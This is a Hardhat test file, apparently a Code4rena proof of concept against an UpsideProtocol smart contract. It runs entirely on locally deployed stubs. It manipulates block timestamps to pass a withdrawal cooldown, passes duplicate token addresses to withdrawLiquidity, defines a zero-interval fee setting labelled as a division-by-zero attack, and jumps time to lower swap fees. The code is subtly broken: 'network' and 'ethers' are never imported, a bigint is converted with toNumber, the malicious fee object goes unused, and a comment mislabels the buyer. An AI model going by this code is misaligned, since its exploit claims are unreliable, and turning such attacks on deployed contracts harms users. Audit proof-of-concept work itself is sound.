import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";
import { ethers as hhethers } from "hardhat";
import {IERC20Metadata, UpsideMetaCoin, UpsideProtocol, UpsideStakingStub} from "../types";
import { expect } from "chai";

describe("C4 PoC Test Suite", function () {
  let signers: HardhatEthersSigner[];
  let owner: HardhatEthersSigner;
  let user: HardhatEthersSigner;
  let attacker: HardhatEthersSigner;
  let user1: HardhatEthersSigner; 

  let stakingContract: UpsideStakingStub;
  let upsideProtocol: UpsideProtocol;
  let liquidityToken: IERC20Metadata;
  let metaCoin: UpsideMetaCoin;
  let sampleLinkToken: UpsideMetaCoin; 

  before(async function () {
    signers = await hhethers.getSigners();
    owner = signers[2];
    user = signers[0];
    attacker = signers[1];
    user1 = signers[3];

    const upsideStakingStubFactory = await hhethers.getContractFactory("UpsideStakingStub");
    stakingContract = await upsideStakingStubFactory.connect(owner).deploy(owner.address);
    await stakingContract.connect(owner).setFeeDestinationAddress(owner.address);

    const upsideProtocolFactory = await hhethers.getContractFactory("UpsideProtocol");
    upsideProtocol = await upsideProtocolFactory.connect(owner).deploy(owner.address);

    // Deploy mock USDC
    const liquidityTokenFactory = await hhethers.getContractFactory("USDCMock");
    liquidityToken = await liquidityTokenFactory.connect(owner).deploy();

    // Setup protocol
    await upsideProtocol.connect(owner).init(await liquidityToken.getAddress());
    await upsideProtocol.connect(owner).setStakingContractAddress(await stakingContract.getAddress());
    
    // Deploy a simple Tokenized URL
    await upsideProtocol.connect(owner).tokenize("https://code4rena.com/", await liquidityToken.getAddress());
    sampleLinkToken = await hhethers.getContractAt("UpsideMetaCoin", await upsideProtocol.urlToMetaCoinMap("https://code4rena.com/"));
  });

  it("should demonstrate withdrawal cooldown manipulation", async function() {
    // First start the withdrawal timer
    await upsideProtocol.connect(owner).withdrawLiquidity([]);
    
    // Check timer started
    const startTime = await upsideProtocol.withdrawLiquidityTimerStartTime();
    console.log("Withdrawal timer started at:", startTime.toString());

    // Try to withdraw immediately (should fail)
    await expect(
      upsideProtocol.connect(owner).withdrawLiquidity([await sampleLinkToken.getAddress()])
    ).to.be.revertedWithCustomError(upsideProtocol, "CooldownTimerNotEnded");

    // Manipulate block.timestamp to just past cooldown
    await network.provider.send("evm_setNextBlockTimestamp", [startTime.toNumber() + 14*24*60*60 + 1]);
    await network.provider.send("evm_mine");

    // Now we can withdraw, and the array validation doesn't prevent duplicates
    await upsideProtocol.connect(owner).withdrawLiquidity(
      Array(10).fill(await sampleLinkToken.getAddress()) // Same address repeated 10 times
    );
    // Set initial fee parameters with zero interval
    const maliciousFeeInfo = {
      tokenizeFeeEnabled: true,
      tokenizeFeeDestinationAddress: owner.address,
      swapFeeStartingBp: 9900,     // 99%
      swapFeeDecayBp: 100,         // 1%
      swapFeeDecayInterval: 0,     // Division by zero!
      swapFeeFinalBp: 100,         // 1%
      swapFeeDeployerBp: 1000,     // 10%
      swapFeeSellBp: 100,          // 1%
    };
    // Set initial fee parameters
    const initialFeeInfo = {
      tokenizeFeeEnabled: true,
      tokenizeFeeDestinationAddress: owner.address,
      swapFeeStartingBp: 9_900, // 99%
      swapFeeDecayBp: 100,      // 1% 
      swapFeeDecayInterval: 6,  // 6 seconds
      swapFeeFinalBp: 100,      // 1%
      swapFeeDeployerBp: 1_000,  // 10%
      swapFeeSellBp: 100,       // 1%
    };

    await upsideProtocol.connect(owner).setFeeInfo(initialFeeInfo);

    // First buyer provides 1000 USDC
    await liquidityToken.mint(user1.address, ethers.parseUnits("1000", 6));
    await liquidityToken.connect(user1).approve(await upsideProtocol.getAddress(), ethers.parseUnits("1000", 6));

    // Get initial time fee
    const initialFee = await upsideProtocol.computeTimeFee(sampleLinkToken.getAddress());
    console.log("Initial swap fee:", initialFee.swapFeeBp.toString(), "bp");

    // Manipulate block.timestamp
    await network.provider.send("evm_increaseTime", [600]); // Jump 10 minutes
    await network.provider.send("evm_mine");

    // Get manipulated time fee  
    const manipulatedFee = await upsideProtocol.computeTimeFee(sampleLinkToken.getAddress());
    console.log("Manipulated swap fee:", manipulatedFee.swapFeeBp.toString(), "bp");
    
    // Attacker buys tokens with reduced fees
    const swapResult = await upsideProtocol.connect(user1).swap.staticCall(
      sampleLinkToken.getAddress(),
      true, // buy
      hhethers.parseUnits("1000", 6),
      0,
      user1.address
    );

    // Execute actual swap
    await upsideProtocol.connect(user1).swap(
      sampleLinkToken.getAddress(), 
      true,
      hhethers.parseUnits("1000", 6),
      0,
      user1.address
    );

    console.log("Tokens received:", hhethers.formatUnits(swapResult, 18));
  });
});